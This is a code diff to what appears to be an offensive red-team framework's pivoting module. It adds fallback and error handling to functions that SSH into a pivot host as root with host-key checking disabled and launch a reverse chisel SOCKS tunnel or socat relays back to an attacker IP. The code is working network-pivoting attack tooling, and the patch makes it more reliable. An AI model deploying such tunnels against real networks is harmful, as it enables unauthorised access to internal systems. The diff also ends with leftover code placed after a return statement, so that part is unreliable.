@@ -9,6 +9,7 @@ from __future__ import annotations
 import json
 import os
 import shlex
+import shutil
 import subprocess
 import time
 
@@ -80,13 +81,30 @@ class PivotingCommandSet(LazyOwnCommandSet):
         }
 
         if method == "chisel":
-            _setup_chisel_pivot(rhost, lhost, hop["port"], networks)
+            ok = _setup_chisel_pivot(rhost, lhost, hop["port"], networks)
         elif method == "ssh":
-            _setup_ssh_pivot(rhost, lhost, hop["port"], networks)
+            ok = _setup_ssh_pivot(rhost, lhost, hop["port"], networks)
         elif method == "socat":
-            _setup_socat_pivot(rhost, lhost, hop["port"], networks)
+            ok = _setup_socat_pivot(rhost, lhost, hop["port"], networks)
         else:
             print_error(f"Unknown method: {method}. Use: chisel, ssh, socat")
+            return
+        if not ok:
+            for fallback in ("ssh", "socat", "chisel"):
+                if fallback == method:
+                    continue
+                print_warn(f"Falling back to --method {fallback}")
+                if fallback == "chisel":
+                    ok = _setup_chisel_pivot(rhost, lhost, hop["port"], networks)
+                elif fallback == "ssh":
+                    ok = _setup_ssh_pivot(rhost, lhost, hop["port"], networks)
+                else:
+                    ok = _setup_socat_pivot(rhost, lhost, hop["port"], networks)
+                if ok:
+                    hop["method"] = fallback
+                    break
+        if not ok:
+            print_error("No pivot tool available: install chisel, ssh or socat.")
             return
 
         chain_entry["hops"].append(hop)
@@ -287,7 +305,7 @@ def _discover_internal_networks(rhost: str) -> list[str]:
         return []
 
 
-def _setup_chisel_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> None:
+def _setup_chisel_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> bool:
     """Set up a Chisel reverse SOCKS proxy.
 
     Args:
@@ -295,31 +313,57 @@ def _setup_chisel_pivot(rhost: str, lhost: str, port: int, networks: list[str]) 
         lhost: Attacker IP.
         port: Local port for the SOCKS proxy.
         networks: Internal networks to route through the pivot.
+
+    Returns:
+        True when the local server started, False when chisel is absent.
     """
+    if shutil.which("chisel") is None:
+        print_error("chisel not found in PATH; install it or use --method ssh|socat")
+        return False
     print_msg("Setting up Chisel pivot...")
-    server_cmd = ["chisel", "server", "-p", str(port), "--reverse"]
-    subprocess.run(server_cmd, shell=False, timeout=5, stderr=subprocess.DEVNULL)
-
-    client_cmd = [
-        "ssh",
-        "-o",
-        "StrictHostKeyChecking=no",
-        f"root@{rhost}",
-        f"chisel client {lhost}:{port} R:socks 2>/dev/null &",
-    ]
-    subprocess.run(client_cmd, shell=False, timeout=10, stderr=subprocess.DEVNULL)
+    try:
+        subprocess.Popen(
+            ["chisel", "server", "-p", str(port), "--reverse"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except OSError as exc:
+        print_error(f"chisel server failed to start: {exc}")
+        return False
+    try:
+        subprocess.run(
+            [
+                "ssh",
+                "-o",
+                "StrictHostKeyChecking=no",
+                f"root@{rhost}",
+                f"chisel client {lhost}:{port} R:socks 2>/dev/null &",
+            ],
+            shell=False,
+            timeout=10,
+            stderr=subprocess.DEVNULL,
+        )
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        print_warn(f"remote chisel client not launched: {exc}")
     time.sleep(2)
+    return True
 
 
-def _setup_ssh_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> None:
+def _setup_ssh_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> bool:
     """Set up an SSH dynamic SOCKS proxy.
 
     Args:
         rhost: Pivot host IP.
         lhost: Attacker IP.
         port: Local port for the SOCKS proxy.
-        networks: Internal networks to route.
+        networks: Internal networks to route through the pivot.
+
+    Returns:
+        True when the SSH tunnel command completed, False otherwise.
     """
+    if shutil.which("ssh") is None:
+        print_error("ssh not found in PATH; cannot set up an SSH SOCKS proxy")
+        return False
     print_msg("Setting up SSH SOCKS proxy...")
     cmd = [
         "ssh",
@@ -333,11 +377,16 @@ def _setup_ssh_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> 
         "ServerAliveInterval=60",
         f"root@{rhost}",
     ]
-    subprocess.run(cmd, shell=False, timeout=10, stderr=subprocess.DEVNULL)
+    try:
+        subprocess.run(cmd, shell=False, timeout=10, stderr=subprocess.DEVNULL)
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        print_error(f"SSH pivot failed: {exc}")
+        return False
     time.sleep(1)
+    return True
 
 
-def _setup_socat_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> None:
+def _setup_socat_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> bool:
     """Set up a Socat relay.
 
     Args:
@@ -345,14 +394,37 @@ def _setup_socat_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -
         lhost: Attacker IP.
         port: Local port for the relay.
         networks: Internal networks.
+
+    Returns:
+        True when the relay commands completed, False when socat is absent.
     """
+    if shutil.which("socat") is None:
+        print_error("socat not found in PATH; install it or use --method ssh|chisel")
+        return False
     print_msg("Setting up Socat relay...")
-    subprocess.run(
-        ["socat", f"TCP-LISTEN:{port},fork,reuseaddr", f"TCP4:{rhost}:{port}"],
-        shell=False,
-        timeout=5,
-        stderr=subprocess.DEVNULL,
-    )
+    try:
+        subprocess.Popen(
+            ["socat", f"TCP-LISTEN:{port},fork,reuseaddr", f"TCP4:{rhost}:{port}"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        subprocess.run(
+            [
+                "ssh",
+                "-o",
+                "StrictHostKeyChecking=no",
+                f"root@{rhost}",
+                f"socat TCP4-LISTEN:{port},fork,reuseaddr SOCKS4A:{lhost}:{rhost}:{port},socksport={DEFAULT_PROXY_PORT} &",
+            ],
+            shell=False,
+            timeout=10,
+            stderr=subprocess.DEVNULL,
+        )
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        print_error(f"socat pivot failed: {exc}")
+        return False
+    time.sleep(1)
+    return True
     subprocess.run(
         [
             "ssh",
